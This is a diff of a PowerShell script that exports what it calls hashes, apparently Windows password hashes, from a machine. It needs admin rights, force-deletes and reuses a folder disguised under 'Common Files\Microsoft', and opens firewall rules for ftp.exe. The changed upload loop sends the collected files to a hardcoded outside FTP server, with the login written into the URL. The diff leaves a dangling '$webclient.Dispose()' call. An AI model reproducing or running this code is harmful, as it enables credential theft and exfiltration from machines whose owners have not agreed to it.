@@ -1,3 +1,5 @@
+echo "Running";
+
 $message = @"
 =================================
     CHOOSE ACTIONS:
@@ -11,16 +13,11 @@ $message = @"
 
 $hostname = (hostname); # get hostname
 
-$privBack = (whoami /priv | findstr "Backup"); # Read privilege to all files
-$privRest = (whoami /priv | findstr "Restore"); # Write privilege to all files
-$privOwn = (whoami /priv | findstr "Ownership"); # chmod privileges to all files
+function Test-IsAdmin {
+     ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+ }
 
-if(($privBack -eq $null) -or ($privRest -eq $null) -or ($privOwn -eq $null)) # Check privileges
-{
-    echo "NOT ENOUGH PRIVILEGES"
-    Exit;
-}
-else # Create sandbox folder
+if(Test-IsAdmin) # Check privileges
 {
     echo "Creating environment";
     rm -r -fo "C:\Program Files\Common Files\Microsoft" -erroraction 'silentlycontinue';
@@ -32,6 +29,11 @@ else # Create sandbox folder
     echo "Setting up Firewall";
     New-NetFirewallRule -DisplayName "FTP-in"  -Direction Inbound -Program "C:\\Windows\\system32\\ftp.exe" -Action Allow >$null;
     New-NetFirewallRule -DisplayName "FTP-out"  -Direction Outbound -Program "C:\\Windows\\system32\\ftp.exe" -Action Allow >$null;
+}
+else
+{
+    echo "NOT ENOUGH PRIVILEGES";
+    Exit;
 }
 
 function choose() # Switch function
@@ -73,25 +75,33 @@ function exportHashes() # 1 - Export hashes
     $ftpdir.UseBinary = $true
 
     $response = $ftpdir.GetResponse();
-
     echo $response.StatusDescription;
-
     $response.Close();
 
     #----------------------------------------------UPLOAD HASHES-----------------------------------------------
 
     $source = "C:\Program Files\Common Files\Microsoft\$hostname";
-    $destination = "ftp://hashes:123passnext321@5.182.17.134//PCs/$hostname";
-
-    $webclient = New-Object -TypeName System.Net.WebClient;
 
     $files = Get-ChildItem $source;
 
     foreach ($file in $files) {
-        echo "Uploading $file";
-        $webclient.UploadFile("$destination/$file", $file.FullName);
-    } 
+        $request = [Net.WebRequest]::Create("ftp://hashes:123passnext321@5.182.17.134//PCs/$hostname/$file")
+        $request.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
 
+        $fileStream = [System.IO.File]::OpenRead("$source/$file")
+        $ftpStream = $request.GetRequestStream()
+
+        $buffer = New-Object Byte[] 10240
+        while (($read = $fileStream.Read($buffer, 0, $buffer.Length)) -gt 0)
+        {
+            $ftpStream.Write($buffer, 0, $read)
+            $pct = ($fileStream.Position / $fileStream.Length)
+            Write-Progress -Activity "Uploading $file" -Status ("{0:P0} complete:" -f $pct) -PercentComplete ($pct * 100)
+        }
+
+        $ftpStream.Dispose()
+        $fileStream.Dispose()
+    }
     $webclient.Dispose();
 
     choose;
